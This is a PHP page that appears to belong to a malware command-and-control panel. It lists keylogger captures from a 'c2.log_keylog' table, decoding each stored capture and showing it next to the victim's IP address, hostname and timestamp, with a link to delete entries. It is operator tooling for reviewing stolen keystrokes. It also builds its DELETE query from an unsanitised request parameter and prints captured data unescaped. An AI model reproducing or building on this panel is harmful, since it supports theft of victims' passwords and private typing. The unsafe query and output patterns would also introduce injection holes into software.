
<?php

include 'conf.php';
include 'db.php';

?>

<html>

<head>
<meta http-equiv="refresh" content="60">


<?php
include 'header.php';
?>



</head>

<body>

<script>
		function myconf(i) {  
			var result;  
			var r = confirm("Delete?");  
			if (r == true) {  
				location.href="key.php?do=D&id=" + i;  
			}   
		} 
	
</script>


<br>

<?php


		if( isset($_REQUEST["do"]) && $_REQUEST["do"]=="D" ) {
			
			$id = $_REQUEST["id"];
			$sql = "DELETE from c2.log_keylog where id=" . $id;
			$result = $conn->query($sql);
			
		}
		
		
	?>
	
	
<div class="container-fluid">
<table  class="table table-bordered table-hover">
<thead>
<tr>
	<td colspan="5" align="center"><h3>C2</h3></td>
</tr>

<tr>
	<th align="center">Indirizzo IP</td>
	<th align="center">Hostname</td>
	<th align="center">Timestamp</td>
    <th align="center">Keylogger</td>
	<th align="center">&nbsp;</td>
</tr>
</thead>
<tbody>
<tr>
	<td colspan="5">&nbsp;</td> 
</tr>


<?php


$sql = "SELECT * FROM c2.log_keylog order by timestamp DESC";
$result = $conn->query($sql);



if ($result->num_rows > 0) {
	
	
  while($row = $result->fetch_assoc()) {	
  
	$id = $row["id"];
  	$b = $row["b64"];
    $data = base64_decode($b);
	
	echo "<tr><td>" . $row["ip_address"] . "</td><td>" . $row["hostname"] . "</td><td>". $row["timestamp"] . "</td><td><textarea rows='6' cols='280' id='data'>" . $data . "</textarea></td><td>";
	echo "<a href=\"javascript:myconf(" . $id . ");\">Delete</a>";
	echo "</td></tr>";
  
  
  
  
  }
} 



 
?>


<tr>
	<td colspan="5">Record number: <?php echo $result->num_rows; ?>&nbsp;|&nbsp;<a href="key.php">Update</a>&nbsp;|&nbsp;<a href="index.php">Home</a></td>
</tr>


</tbody>
</table>
</div>
</body>
</html>